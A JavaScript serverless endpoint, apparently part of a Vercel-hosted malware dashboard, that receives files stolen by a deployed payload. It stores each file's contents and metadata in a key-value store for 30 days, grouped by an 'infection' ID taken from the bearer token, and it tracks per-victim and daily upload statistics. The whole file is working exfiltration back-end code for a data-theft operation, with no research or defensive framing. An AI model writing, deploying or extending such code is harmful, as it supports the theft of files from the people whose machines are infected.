// vercel-dashboard/api/exfil/upload.js
// Exfiltration ingestion endpoint - receives files from payload

import { kv } from '../../lib/kv.js';

const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB
const MAX_FILES_PER_INFECTION = 1000;

export default async function handler(request, response) {
  // CORS preflight
  if (request.method === 'OPTIONS') {
    return response.status(200).end();
  }

  if (request.method !== 'POST') {
    return response.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Extract infection ID from API key or generate
    const apiKey = request.headers['authorization']?.replace('Bearer ', '') || 'anonymous';
    const infectionId = apiKey.length > 20 ? apiKey.substring(0, 20) : `inf_${apiKey}`;
    
    // Get raw body
    const contentType = request.headers['content-type'] || '';
    let fileData, fileName, fileExt;
    
    if (contentType.includes('multipart/form-data')) {
      // Handle multipart (not implemented in this simple version)
      return response.status(400).json({ error: 'Use raw binary upload' });
    } else {
      // Raw binary upload
      const chunks = [];
      for await (const chunk of request.body) {
        chunks.push(chunk);
      }
      fileData = Buffer.concat(chunks);
      fileName = request.headers['x-file-name'] || `file_${Date.now()}.bin`;
      fileExt = fileName.split('.').pop()?.toLowerCase() || 'bin';
    }

    if (fileData.length > MAX_FILE_SIZE) {
      return response.status(413).json({ error: 'File too large' });
    }

    // Generate unique file ID
    const fileId = `f_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    
    // Store file metadata in KV
    const fileMeta = {
      id: fileId,
      infectionId,
      fileName,
      fileExt,
      size: fileData.length,
      uploadedAt: new Date().toISOString(),
      contentType: request.headers['content-type'] || 'application/octet-stream'
    };

    // Store in KV with TTL (30 days)
    await Promise.all([
      kv.set(`file:${fileId}:meta`, fileMeta, { ex: 30 * 24 * 60 * 60 }),
      kv.set(`file:${fileId}:data`, fileData.toString('base64'), { ex: 30 * 24 * 60 * 60 }),
      kv.sadd(`infection:${infectionId}:files`, fileId),
      kv.hincrby(`infection:${infectionId}:stats`, 'totalFiles', 1),
      kv.hincrby(`infection:${infectionId}:stats`, 'totalBytes', fileData.length),
      kv.hset(`infection:${infectionId}:stats`, 'lastSeen', new Date().toISOString()),
      // Track extension stats
      kv.hincrby(`infection:${infectionId}:exts`, fileExt, 1),
      // Track daily stats
      kv.hincrby(`global:daily:${new Date().toISOString().split('T')[0]}`, 'uploads', 1),
      kv.hincrby(`global:daily:${new Date().toISOString().split('T')[0]}`, 'bytes', fileData.length),
    ]);

    // Check if we should store the file data (only for small files to save KV space)
    // For larger files, we just track metadata

    response.status(200).json({ 
      success: true, 
      fileId,
      message: 'File received'
    });

  } catch (error) {
    console.error('Exfil error:', error);
    response.status(500).json({ error: 'Internal server error' });
  }
}

// Disable body parsing for raw uploads
export const config = {
  api: {
    bodyParser: false,
  },
};
